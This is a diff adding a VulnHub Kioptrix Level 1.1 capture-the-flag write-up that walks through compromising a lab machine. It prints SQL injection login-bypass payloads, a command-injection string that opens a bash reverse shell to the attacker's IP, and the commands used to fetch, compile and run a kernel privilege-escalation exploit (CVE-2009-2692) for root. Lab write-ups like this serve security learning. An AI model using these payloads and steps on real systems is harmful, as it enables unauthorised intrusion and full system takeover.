@@ -1,0 +1,250 @@
+# Kioptrix Level 1.1 — VulnHub CTF Writeup
+
+![Platform](https://img.shields.io/badge/Platform-VulnHub-blue) ![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green) ![OS](https://img.shields.io/badge/OS-CentOS-orange) ![Status](https://img.shields.io/badge/Status-Pwned%20%F0%9F%8F%86-brightgreen)
+
+## Machine Info
+
+| Field | Details |
+|---|---|
+| Platform | VulnHub |
+| Difficulty | Easy |
+| OS | CentOS 4.5 (Final) |
+| IP | 192.168.56.105 |
+| Date Completed | May 22, 2026 |
+
+---
+
+## Summary
+
+Kioptrix 1.1 is a classic beginner machine featuring SQL injection on a login form to bypass authentication, command injection on an admin web console to get a reverse shell, and a Linux kernel privilege escalation exploit (CVE-2009-2692) to achieve root. OWASP ZAP was also used for automated vulnerability scanning.
+
+---
+
+## Tools Used
+
+| Tool | Purpose |
+|---|---|
+| Nmap | Port scanning and service detection |
+| OWASP ZAP | Automated web vulnerability scanning |
+| Browser | Manual SQL injection testing |
+| Netcat (nc) | Reverse shell listener |
+| searchsploit | Kernel exploit search |
+| gcc | Compiling the kernel exploit |
+| wget | Transferring exploit to target |
+| Python3 | Serving exploit file via HTTP |
+
+---
+
+## Enumeration
+
+### Step 1 — Port Scanning
+
+```bash
+nmap -sV -sC 192.168.56.105
+```
+
+**Results:**
+
+```
+PORT     STATE  SERVICE   VERSION
+22/tcp   open   ssh       OpenSSH 3.9p1 Debian
+80/tcp   open   http      Apache httpd 2.0.52 (CentOS)
+111/tcp  open   rpcbind   2 (RPC #100000)
+443/tcp  open   ssl/http  Apache httpd 2.0.52 (CentOS)
+631/tcp  open   ipp       CUPS 1.1
+3306/tcp open   mysql     MySQL (unauthorized)
+```
+
+Key findings:
+- Port 80/443 — Apache web server
+- Port 3306 — MySQL exposed
+- `http-title` — Site has no title (login page)
+- OS: CentOS 4.5
+
+### Step 2 — Web Vulnerability Scanning with OWASP ZAP
+
+Ran an automated scan against `http://192.168.56.105`:
+
+**OWASP ZAP Findings:**
+
+| Alert | Risk | Notes |
+|---|---|---|
+| SQL Injection | High | POST to index.php |
+| Absence of Anti-CSRF Tokens | Medium | Login form |
+| Content Security Policy Not Set | Medium | |
+| Missing Anti-clickjacking Header | Medium | |
+| Server Version Information Leak | Low | Apache version exposed |
+| X-Powered-By Header | Low | PHP version exposed |
+| Tech Detected | Info | Apache, CentOS, PHP |
+
+Most critical finding: **SQL Injection on the login form (index.php)**
+
+### Step 3 — Manual Web Enumeration
+
+Visiting `http://192.168.56.105` revealed a **Remote System Administration Login** page with username and password fields.
+
+---
+
+## Exploitation
+
+### SQL Injection — Authentication Bypass
+
+Tested SQL injection payloads in the username field:
+
+**Payload 1 (comment-based):**
+```
+admin' --
+```
+Password: anything → Did not work cleanly
+
+**Payload 2 (OR-based):**
+```
+admin' or '1'='1
+```
+Password: anything → **It worked!**
+
+Successfully bypassed authentication and accessed the **Basic Administrative Web Console** — a ping utility.
+
+---
+
+## Command Injection → Reverse Shell
+
+The web console allowed pinging machines on the network. The input was vulnerable to **command injection**.
+
+**Step 1 — Test command injection:**
+```
+192.168.56.102; whoami
+```
+Output showed: `apache` — confirmed command injection works!
+
+**Step 2 — Set up netcat listener on Kali:**
+```bash
+nc -lvp 4444
+```
+
+**Step 3 — Inject bash reverse shell:**
+```
+192.168.56.105; bash -i >& /dev/tcp/192.168.56.102/4444 0>&1
+```
+
+Received reverse shell connection:
+```
+connect to [192.168.56.102] from (UNKNOWN) [192.168.56.105] 32830
+bash-3.00$ whoami
+apache
+```
+
+---
+
+## Post-Exploitation Enumeration
+
+```bash
+cat /etc/redhat-release
+# CentOS release 4.5 (Final)
+
+lsb_release -a
+# CentOS release 4.5 (Final), Kernel: Linux 2.6.9
+
+cat /etc/passwd
+# enumerated system users
+```
+
+Checked OS version: **CentOS 4.5, Kernel 2.6.9**
+
+---
+
+## Privilege Escalation
+
+### Linux Kernel Exploit — CVE-2009-2692 (Linux 2.6.x sock_sendpage)
+
+Searched for kernel exploits on Kali:
+
+```bash
+searchsploit CentOS 4.5
+```
+
+Found: **Linux Kernel 3.14.5 (CentOS 7/RHEL) — 'libfutex' Local Privilege Escalation**
+
+Also found exploit **9479.c** (sock_sendpage NULL pointer dereference — affects Linux 2.6.x):
+
+```bash
+searchsploit -m linux/local/9479.c
+cp /usr/share/exploitdb/exploits/linux/local/9479.c ~/
+```
+
+**Step 1 — Serve exploit via Python HTTP server on Kali:**
+```bash
+python3 -m http.server 8888
+```
+
+**Step 2 — Download exploit on target:**
+```bash
+cd /tmp
+wget http://192.168.56.102:8888/9479.c
+```
+
+**Step 3 — Compile and run:**
+```bash
+gcc 9479.c -o exploit3
+./exploit3
+```
+
+**Root shell obtained!**
+```
+sh-3.00# whoami
+root
+```
+
+---
+
+## Attack Chain
+
+```
+Nmap (port scan → Apache, MySQL, CentOS 4.5)
+    ↓
+OWASP ZAP (automated scan → SQL Injection found)
+    ↓
+SQL Injection → auth bypass → admin web console
+    ↓
+Command Injection → bash reverse shell (apache user)
+    ↓
+OS enumeration → CentOS 4.5, Kernel 2.6.9
+    ↓
+searchsploit → CVE-2009-2692 (9479.c)
+    ↓
+wget exploit → gcc compile → execute
+    ↓
+🏆 root shell
+```
+
+---
+
+## Key Takeaways
+
+- **OWASP ZAP** is a great tool for automated web scanning — it found the SQL injection vulnerability immediately
+- **SQL injection** in login forms can completely bypass authentication without knowing any credentials
+- **Command injection** is dangerous when user input is passed directly to system commands (like ping)
+- Always check the **OS and kernel version** after getting a shell — outdated kernels often have public exploits
+- Use **searchsploit** to quickly find local privilege escalation exploits
+- Serve exploit files with **python3 -m http.server** and download with **wget** — a clean file transfer technique
+
+---
+
+## Vulnerabilities Summary
+
+| Vulnerability | Type | Impact |
+|---|---|---|
+| SQL Injection on login | Authentication Bypass | Critical |
+| Command Injection in ping utility | RCE | Critical |
+| Outdated Linux Kernel 2.6.9 | Local Privilege Escalation | Critical |
+| MySQL exposed on port 3306 | Information Disclosure | Medium |
+| Apache/PHP version disclosure | Information Disclosure | Low |
+
+---
+
+## References
+
+- [VulnHub Kioptrix Level 1.1](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/)
+- [CVE-2009-2692 — sock_sendpage exploit](https://www.exploit-db.com/exploits/9479)
+- [OWASP ZAP](https://www.zaproxy.org/)
+- [searchsploit usage](https://www.exploit-db.com/searchsploit)
